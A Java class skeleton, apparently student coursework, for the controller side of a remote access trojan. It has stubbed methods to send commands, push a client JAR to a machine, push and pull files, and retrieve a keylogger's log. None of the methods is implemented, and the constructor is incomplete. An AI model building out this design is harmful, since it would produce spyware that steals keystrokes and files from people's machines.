package edu.wit.comp2100;

import java.io.File;
import java.net.Inet4Address;
import java.nio.file.Path;

public class Client {

    //class variables
    private String machineName;
    private Inet4Address Server_IP;
    private Inet4Address RAT_IP;
    private boolean isActive;
    private File lastRecievedFile;

    Client(){
        this.Server_IP = Inet4Address.getLocalHost(); //TODO handle UnknownHostException
    }

    Client(Inet4Address client_IP){
        this();
        this.RAT_IP = client_IP;
    }

    /*
    sends command to RAT over a socket
     */
    public void sendCommand(String[] args){

    }

    /*
    pushes the client file/JAR to the bootstrap client running on a machine
     */
    public boolean pushClient(){
        //TODO implement this method
        return false;
    }

    /*
    Wrapper method for pushFile(File, Path) that takes just a file,
    sends the file to a predefined default path.
     */
    public boolean pushFile(File toPush){
        Path defaultPath = null; //TODO decide on a default path
        return pushFile(toPush, defaultPath);
    }
    /*
    takes a file as input and sends file to client
    then sends another message to the client telling them where to put the file
     */
    public boolean pushFile(File toPush, Path path){
        //TODO implement this method
        return false;
    }

    /*
    Takes a path as input
    sends request to client for a file (RAT will ask for path and this object will specify)
    wait for response and recieve file.
    set lastRecievedFile as the recieved file,
    return lastRecievedFile.

    If our communication with the RAT times out at any stage, throw an exception and return null.
    our timeout should be about 2-5 seconds waiting for a reply
     */
    public File pullFile(Path pathToFile){
        //TODO implement this method
        return null;
    }

    public File pullKeylog(){
        /*
        TODO: decide - we could do it this way, or this could be an independent method that sends a text
            command and waits for a file after. text command could be something like "pushKeyLog"
         */
        Path keylogPath = null; //TODO decide on default path for keylogger file
        return pullFile(keylogPath);
    }
}
